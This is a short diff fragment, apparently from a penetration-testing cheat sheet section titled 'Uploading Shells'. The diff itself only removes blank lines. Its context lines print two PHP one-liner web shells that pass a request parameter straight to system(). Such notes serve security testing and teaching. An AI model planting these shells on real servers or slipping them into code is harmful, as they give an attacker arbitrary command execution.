@@ -146,9 +146,7 @@ Uploading Shells:
 		
 - PHP oneliner:
 	>> ` <?php echo system($_REQUEST['cmd']); ?> `
-	
 	&nbsp;
-
 	>> ` <?php echo system($_GET['cmd'].' 2>&1'); ?> ` 
 
 	
